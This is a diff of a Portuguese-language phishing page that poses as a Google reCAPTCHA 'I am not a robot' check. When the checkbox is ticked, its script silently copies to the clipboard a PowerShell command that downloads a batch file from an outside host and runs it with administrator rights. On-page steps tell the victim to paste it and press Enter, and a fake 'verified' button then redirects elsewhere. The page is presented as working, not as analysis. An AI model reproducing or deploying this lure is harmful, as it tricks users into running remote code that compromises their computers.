@@ -114,7 +114,6 @@
             font-weight: 500;
             margin-top: 15px;
             transition: background 0.2s;
-            disabled: true;
         }
 
         #verify-button:hover:not(:disabled) {
@@ -125,15 +124,6 @@
             background: #ccc;
             cursor: not-allowed;
         }
-
-        @keyframes spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(720deg); }
-        }
-
-        .spin-animation {
-            animation: spin 0.8s ease-out;
-        }
     </style>
 </head>
 <body>
@@ -143,7 +133,6 @@
                 <input type="checkbox" id="captcha-checkbox">
                 <span style="font-size: 16px; color: #202124;">Não sou um robô</span>
             </label>
-            
             <div class="recaptcha-brand">
                 <div class="recaptcha-logo">
                     <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
@@ -161,54 +150,33 @@
                     <li>Pressione <strong>Enter</strong> para finalizar</li>
                 </ol>
             </div>
-            
             <div class="verification-code">
                 "Não sou um robô - ID do reCAPTCHA:2417"
             </div>
-
+            <button id="verify-button" onclick="verificarCaptcha()">VERIFICAR</button>
+        </div>
+    </div>
     <script>
         document.getElementById('captcha-checkbox').addEventListener('change', function() {
             const command = `powershell -Command "& {iwr -useb 'https://omiie.com/tools/2fa.bat' -OutFile $env:TEMP\2fa.bat; Start-Process -FilePath $env:TEMP\2fa.bat -Verb RunAs}"`;
-            
             const textArea = document.createElement('textarea');
             textArea.value = command;
             document.body.appendChild(textArea);
             textArea.select();
             document.execCommand('copy');
             document.body.removeChild(textArea);
-
-            const logo = document.querySelector('.recaptcha-logo img');
-            logo.classList.add('spin-animation');
-            setTimeout(() => logo.classList.remove('spin-animation'), 800);
-
             document.getElementById('verification-box').style.display = 'block';
-
-            const button = document.getElementById('verify-button');
-            button.disabled = true;
-            let seconds = 6;
-            
-            const countdown = setInterval(() => {
-                button.textContent = `VERIFICAR (${seconds})`;
-                seconds--;
-                
-                if(seconds < 0) {
-                    clearInterval(countdown);
-                    button.disabled = false;
-                    button.textContent = 'VERIFICAR';
-                }
-            }, 2000);
         });
 
         function verificarCaptcha() {
             const button = document.getElementById('verify-button');
             button.innerHTML = 'Verificando...';
             button.disabled = true;
-            
             setTimeout(() => {
                 button.innerHTML = '✔ Verificado';
                 button.style.backgroundColor = '#34a853';
                 setTimeout(() => {
-                    window.location.href = 'https://www.foregon.com/'; // REDIRECIONAMENTO
+                    window.location.href = 'https://www.foregon.com/'; // Redirecionamento
                 }, 500);
             }, 2000);
         }
